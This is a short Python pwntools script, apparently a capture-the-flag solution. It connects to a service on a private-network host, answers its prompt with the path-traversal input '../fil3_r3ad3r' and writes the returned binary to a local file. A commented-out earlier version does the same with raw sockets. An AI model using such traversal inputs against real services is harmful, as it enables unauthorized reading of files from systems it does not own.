# import socket
# from pwn import *

# # Replace the following variables with the appropriate values
# host = '192.168.11.101'
# port = 32823  # Replace with the correct port number
# output_file = 'out'  # Replace with the desired output file name

# # Create a socket object
# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# # Connect to the remote TCP server
# sock.connect((host, port))

# question = sock.recv(81).decode()
# print(question)
# sock.sendall("../fil3_r3ad3r".encode())

# # Receive and save the binary executable file
# with open(output_file, 'wb') as file:
#     while True:
#         data = sock.recv(1837)  # Adjust the buffer size as needed
#         if not data:
#             break
#         file.write(data)

# # Close the socket connection
# sock.close()

# # p = remote("192.168.11.101", 32823)

# # h = p.recvuntil(b":")
# # print(len(h))
# # print(h)
# # p.sendline(b"../fil3_r3ad3r")
# # b = p.recvline()
# # print(b)
# # print(len(b))

from pwn import *

# Replace the following variables with the appropriate values
host = '192.168.11.101'
port = 32904  # Replace with the correct port number
output_file = 'out'  # Replace with the desired output file name
name = b'../fil3_r3ad3r'  # Replace with your desired name

# Establish a connection to the remote TCP server
conn = remote(host, port)

# Receive the question and send the response
question = conn.recvuntil(b":").decode().strip()
print(question)
conn.sendline(name)
# byte = conn.recvall()
# print(byte)

# Receive and save the binary executable file
with open(output_file, 'wb') as file:
    file.write(conn.recvall())

file.close()
# Close the connection
conn.close()